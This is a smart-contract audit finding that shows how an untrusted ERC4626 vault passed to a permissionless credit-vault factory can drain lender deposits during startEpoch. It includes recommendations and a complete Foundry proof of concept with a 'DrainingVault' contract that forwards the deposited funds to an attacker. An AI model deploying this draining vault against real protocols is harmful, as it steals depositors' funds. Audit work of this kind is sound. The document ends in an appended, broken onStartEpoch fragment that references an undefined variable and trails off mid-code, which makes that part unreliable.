### Title

Untrusted ERC4626 vault can drain revolving-credit deposits during `startEpoch` - (File: contracts/IdleCreditVaultFactory.sol)

### Summary

`deployRevolvingCreditVault` is permissionless and accepts an arbitrary `programmableBorrowerParams.vault`, while `ProgrammableBorrower.initialize` only verifies that `vault.asset()` equals the CDO underlying before granting the vault unlimited underlying allowance. The vault is then invoked by `onStartEpoch` and receives every idle underlying through `vault.deposit`, so a malicious ERC4626-compatible contract can claim the expected asset and drain the facility when the honest manager starts the first epoch. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description

The factory deploys the programmable borrower with the caller-supplied vault address and immediately wires it as the strategy borrower. [4](#0-3)  `ProgrammableBorrower.initialize` validates only nonzero addresses and `IERC4626(_vault).asset() == CDO.token()`, then approves that vault for unlimited underlying spending. [5](#0-4) 

A pool depositor sends underlying through `depositAA`/`depositBB`, the CDO deposits those funds into `IdleCreditVault`, and `startEpoch` transfers the resulting balance to the programmable borrower. [6](#0-5) [7](#0-6) [8](#0-7)  `onStartEpoch` then calls `_depositToVault` with the programmable borrower's full underlying balance, and `_depositToVault` delegates custody to the configured vault. [9](#0-8) [10](#0-9) 

There is no vault allowlist, registry lookup, bytecode check, deployment provenance check, cap, or post-deposit solvency assertion in this path. [11](#0-10) [10](#0-9)  A malicious contract therefore only needs to expose the expected `asset()` and an ERC4626-shaped `deposit` function to receive or pull the entire facility balance.

### Impact Explanation

This breaks the solvency and fair-mint invariant: lenders receive tranche shares and the CDO holds strategy tokens, while the underlying backing has been transferred to an attacker-controlled vault. [12](#0-11) [10](#0-9) 

In the concrete flow, an attacker creates a malicious ERC4626 vault reporting the correct `asset`, deploys a revolving facility through the permissionless factory, waits for lenders to deposit, and relies on the honest manager's ordinary `startEpoch` call. [13](#0-12) [14](#0-13)  The malicious `deposit` implementation can use the allowance granted at initialization, transfer the full deposited amount to the attacker, and mint harmless-looking shares back to the programmable borrower. [15](#0-14) [3](#0-2) 

The direct loss is the full amount deposited into the facility before the epoch starts; in the PoC below, 100,000 units are stolen from one lender.

### Likelihood Explanation

The attack requires an attacker to persuade users or an operator to use a maliciously parameterized factory deployment, but no privileged role needs to be compromised. [1](#0-0)  The attacker only supplies an address satisfying the ERC4626 interface; the contract-level check does not distinguish a legitimate vault from a malicious implementation reporting the same asset. [16](#0-15) 

The honest manager's normal `startEpoch` transaction is the trigger, and the malicious code executes inside that trusted setup/accounting hook rather than requiring a separate privileged action. [17](#0-16) 

### Recommendation

Do not treat `asset()` equality as proof that an ERC4626 vault is trusted.

- Restrict `programmableBorrowerParams.vault` to a governance-maintained registry/allowlist, or deploy the vault adapter through a factory-controlled canonical mechanism.
- Record vault provenance in the deployment event and expose a clear `trustedVault` marker only after registry validation.
- Prefer exact or bounded approvals over the standing unlimited approval granted during initialization.
- After `_depositToVault`, verify that the returned shares correspond to retrievable assets, while recognizing that view-based checks alone cannot prove an external vault is non-malicious.

### Proof of Concept

The following Foundry test deploys the production factory and implementations on a fork, registers a malicious vault that returns the correct `asset`, and shows that a normal lender deposit is stolen during the honest manager's `startEpoch` call.

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {ProgrammableBorrower} from
  "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract PoCToken is ERC20 {
  constructor() ERC20("USD Coin", "USDC") {}

  function decimals() public pure override returns (uint8) {
    return 6;
  }

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract DrainingVault is ERC20 {
  PoCToken public immutable underlying;
  address public immutable attacker;

  constructor(PoCToken token_, address attacker_)
    ERC20("Malicious Vault Share", "MVS")
  {
    underlying = token_;
    attacker = attacker_;
  }

  function asset() external view returns (address) {
    return address(underlying);
  }

  function convertToAssets(uint256 shares) external pure returns (uint256) {
    return shares;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    // ProgrammableBorrower granted this contract unlimited allowance.
    underlying.transferFrom(msg.sender, address(this), assets);
    underlying.transfer(attacker, assets);

    // Keep the programmable borrower holding apparently valid shares.
    _mint(receiver, assets);
    return assets;
  }

  function withdraw(uint256, address, address)
    external
    pure
    returns (uint256)
  {
    revert("stolen");
  }
}

contract ProgrammableBorrowerUntrustedVaultTest is Test {
  IdleCreditVaultFactory internal factory;
  PoCToken internal token;
  DrainingVault internal maliciousVault;

  address internal treasury = makeAddr("treasury");
  address internal proxyAdmin = makeAddr("proxyAdmin");
  address internal honestManager = makeAddr("honestManager");
  address internal honestBorrower = makeAddr("honestBorrower");
  address internal lender = makeAddr("lender");
  address internal attacker = makeAddr("attacker");

  function testMaliciousVaultDrainsFirstEpochDeposit() external {
    token = new PoCToken();
    maliciousVault = new DrainingVault(token, attacker);

    IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
    factory = IdleCreditVaultFactory(address(new TransparentUpgradeableProxy(
      address(factoryImpl),
      proxyAdmin,
      abi.encodeWithSelector(
        IdleCreditVaultFactory.initialize.selector,
        treasury,
        proxyAdmin
      )
    )));

    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
    IdleCreditVault strategyImpl = new IdleCreditVault();
    ProgrammableBorrower borrowerImpl = new ProgrammableBorrower();

    IdleCreditVaultFactory.CreditVaultParams memory cvParams =
      IdleCreditVaultFactory.CreditVaultParams({
        implementation: address(cdoImpl),
        limit: 0,
        underlying: address(token),
        apr: 0,
        epochDuration: 30 days,
        bufferPeriod: 1 days,
        instantWithdrawDelay: 0,
        instantWithdrawAprDelta: 0,
        disableInstantWithdraw: true,
        keyringPolicy: 0,
        feeReceiver: treasury,
        fees: 5_000,
        managementFee: 500,
        isInterestMinted: true,
        isDepositDuringEpochDisabled: true
      });

    IdleCreditVaultFactory.StrategyData memory strategyData =
      IdleCreditVaultFactory.StrategyData({
        implementation: address(strategyImpl),
        manager: honestManager,
        borrower: honestBorrower,
        borrowerName: "Borrower"
      });

    IdleCreditVaultFactory.ProgrammableBorrowerParams memory pbParams =
      IdleCreditVaultFactory.ProgrammableBorrowerParams({
        implementation: address(borrowerImpl),
        vault: address(maliciousVault),
        borrower: honestBorrower,
        borrowerApr: 365e18
      });

    IdleCreditVaultFactory.AncillaryParams memory ancillary =
      IdleCreditVaultFactory.AncillaryParams({
        keyring: address(0),
        queueImplementation: address(0),
        prefundedDepositWindow: 0,
        writeOffImplementation: address(0)
      });

    vm.recordLogs();
    factory.deployRevolvingCreditVault(cvParams, strategyData, pbParams, ancillary);
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(
      _deployedCreditVault(vm.getRecordedLogs())
    );

    uint256 depositAmount = 100_000e6;
    token.mint(lender, depositAmount);
    vm.startPrank(lender);
    token.approve(address(cdo), depositAmount);
    cdo.depositAA(depositAmount);
    vm.stopPrank();

    // Ordinary lifecycle action by the honest manager activates the untrusted vault.
    vm.prank(honestManager);
    cdo.startEpoch();

    assertEq(token.balanceOf(attacker), depositAmount);
    assertEq(token.balanceOf(address(maliciousVault)), 0);
    assertTrue(cdo.isEpochRunning());
  }

  function _deployedCreditVault(Vm.Log[] memory logs)
    internal
    pure
    returns (address)
  {
    bytes32 sig = keccak256(
      "CreditVaultDeployed(address,address,address,address,address,address)"
    );
    for (uint256 i; i < logs.length; ++i) {
      if (logs[i].topics[0] == sig) {
        (address cdo,,,,,) =
          abi.decode(logs[i].data, (address,address,address,address,address,address));
        return cdo;
      }
    }
    revert("deployment not found");
  }
}

  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);

    if (_amount == 0) {

    }
    // check that we are not depositing more than the contract available limit
